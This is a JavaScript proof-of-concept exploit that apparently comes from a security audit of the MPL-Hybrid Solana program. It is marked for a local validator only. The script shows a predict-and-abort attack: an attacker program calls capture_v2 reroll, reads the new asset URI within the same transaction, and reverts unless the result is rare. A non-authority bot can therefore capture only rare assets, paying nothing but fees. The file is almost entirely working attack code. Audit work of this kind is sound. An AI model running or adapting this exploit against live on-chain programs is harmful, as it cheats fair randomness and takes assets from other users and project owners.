// PoC 13 (A-04, on-chain, LOCAL VALIDATOR ONLY): predict-and-abort against MPL-Hybrid capture_v2 reroll.
// An attacker program (poc/guard-src, reroll_guard.so) CPIs capture_v2 in reroll mode, reads the asset's
// new URI from the post-CPI account data in the SAME tx, and fails the tx unless index < RARE_MAX.
// Permissionless mode: the recipe PDA is the collection's UpdateDelegate (capture_v2.rs:229-237), so a
// non-authority bot captures. Failed attempts are sent with skipPreflight so they land and revert on-chain.
const L = require('./lib.js');
const {TransactionInstruction, PublicKey, Keypair, SystemProgram, Transaction, ComputeBudgetProgram} = require('@solana/web3.js');
const GUARD = new PublicKey('6EeWVwV7k5XKyfVhVxJQ2Z4ANe5PtrDsBMx4t4FMrF6S');
const RARE_MAX = 10n, SPAN = 100, WANT = 3, MAX_ATTEMPTS = 250, K = 12;
const u32 = n => { const b = Buffer.alloc(4); b.writeUInt32LE(n); return b; };
const str = s => { const d = Buffer.from(s); return Buffer.concat([u32(d.length), d]); };
async function ownerOf(pk){ const ai = await L.conn.getAccountInfo(pk); return new PublicKey(ai.data.slice(1,33)); }
function uriOf(data){ let o=33; const t=data[o]; o+=1; if(t!==0) o+=32; const nl=data.readUInt32LE(o); o+=4+nl; const ul=data.readUInt32LE(o); o+=4; return data.slice(o,o+ul).toString(); }
async function bal(ata){ try { return (await L.getAccount(L.conn, ata)).amount; } catch(e){ return 0n; } }
async function createCollectionWithDelegate(payer, ua){
  const col = Keypair.generate();
  const recipe = L.recipePda(col.publicKey);
  // CreateCollectionV1: disc 1, name, uri, plugins=Some([ {UpdateDelegate{additional_delegates:[]}, Some(Address{recipe})} ])
  const plugins = Buffer.concat([Buffer.from([1]), u32(1), Buffer.from([4]), u32(0), Buffer.from([1, 3]), recipe.toBuffer()]);
  const data = Buffer.concat([Buffer.from([1]), str('Mintmark'), str('u'), plugins]);
  const keys = [L.m(col.publicKey,true,true), L.m(ua.publicKey,false,false), L.m(payer.publicKey,true,true), L.m(SystemProgram.programId,false,false)];
  await L.send([new TransactionInstruction({programId:L.MPL_CORE, keys, data})],[payer, col]);
  return col;
}
(async()=>{
  const auth = Keypair.generate(); await L.airdrop(auth.publicKey, 500);
  const R = 1_000_000n;
  const mint = await L.createMint(L.conn, auth, auth.publicKey, null, 0);
  const col = await createCollectionWithDelegate(auth, auth);
  const escrow = await L.initEscrowV2(auth);
  const recipe = await L.initRecipeV1(auth, col.publicKey, mint, auth.publicKey, {name:'N', uri:'u', max:SPAN, min:0, amount:Number(R), path:0});
  const escAta = (await L.getOrCreateAssociatedTokenAccount(L.conn, auth, mint, escrow, true)).address;
  const feeAta = (await L.getOrCreateAssociatedTokenAccount(L.conn, auth, mint, auth.publicKey)).address;
  const assets = []; for (let i=0;i<K;i++) assets.push((await L.createAsset(auth, col, auth, escrow, 'A'+i, 'u')).publicKey);
  const bot = Keypair.generate(); await L.airdrop(bot.publicKey, 50);
  const botAta = (await L.getOrCreateAssociatedTokenAccount(L.conn, auth, mint, bot.publicKey)).address;
  await L.mintTo(L.conn, auth, mint, botAta, auth, Number(R) * K);
  console.log(`setup: recipe span [0,${SPAN}), rare = index < ${RARE_MAX} (honest odds ${Number(RARE_MAX)}%), bot is NOT the authority`);
  let wins = 0, aborts = 0, attempts = 0, abortStateOk = true; const committed = [];
  let next = 0;
  while (wins < WANT && attempts < MAX_ATTEMPTS) {
    attempts++;
    const asset = assets[next];
    const before = {tok: await bal(botAta), owner: (await ownerOf(asset)).toBase58()};
    const capKeys = L.captureKeys(bot, recipe, recipe, escrow, asset, col.publicKey, botAta, escAta, mint, feeAta, auth.publicKey);
    const keys = [L.m(L.MPL_HYBRID,false,false), ...capKeys];
    const data = Buffer.concat([L.u64(RARE_MAX), L.disc('capture_v2')]);
    const tx = new Transaction().add(ComputeBudgetProgram.setComputeUnitLimit({units: 1_000_000}),
      ComputeBudgetProgram.setComputeUnitPrice({microLamports: attempts}),
      new TransactionInstruction({programId: GUARD, keys, data}));
    tx.feePayer = bot.publicKey; tx.recentBlockhash = (await L.conn.getLatestBlockhash()).blockhash; tx.sign(bot);
    const sig = await L.conn.sendRawTransaction(tx.serialize(), {skipPreflight: true});
    const conf = await L.conn.confirmTransaction(sig, 'confirmed');
    const t = await L.conn.getTransaction(sig, {commitment:'confirmed', maxSupportedTransactionVersion:0});
    const guardLog = (t.meta.logMessages||[]).filter(l => l.includes('GUARD')).join(' | ');
    if (conf.value.err) {
      aborts++;
      const after = {tok: await bal(botAta), owner: (await ownerOf(asset)).toBase58()};
      if (after.tok !== before.tok || after.owner !== before.owner) abortStateOk = false;
      if (aborts <= 3 || attempts % 20 === 0) console.log(`attempt ${attempts}: ABORTED on-chain (slot ${t.slot}) ${guardLog}; bot tokens ${after.tok} unchanged, asset still in escrow`);
    } else {
      const ai = await L.conn.getAccountInfo(asset); const uri = uriOf(ai.data);
      const idx = BigInt(uri.replace(/^u/, '').replace(/\.json$/, ''));
      const owner = (await ownerOf(asset));
      committed.push({attempt: attempts, slot: t.slot, uri, idx, ownerIsBot: owner.equals(bot.publicKey)});
      wins++; next++;
      console.log(`attempt ${attempts}: COMMITTED (slot ${t.slot}) uri=${uri} owner=bot:${owner.equals(bot.publicKey)} ${guardLog}`);
    }
  }
  const allRare = committed.length > 0 && committed.every(c => c.idx < RARE_MAX && c.ownerIsBot);
  console.log(`\nattempts=${attempts} aborts=${aborts} commits=${committed.length}; every committed index < ${RARE_MAX}: ${allRare}; abort left state unchanged: ${abortStateOk}`);
  console.log(`observed rare rate among committed = ${committed.length}/${committed.length} vs honest ${Number(RARE_MAX)}%; cost of aborts = tx fees only`);
  if (wins === WANT && allRare && abortStateOk && aborts > 0) console.log('POC 13 EXECUTED: PASS (on-chain predict-and-abort: only rare rerolls ever commit)');
  else { console.log('POC 13 FAIL'); process.exit(1); }
})().catch(e => { console.error('POC 13 ERROR', e.message, e.logs || ''); process.exit(1); });
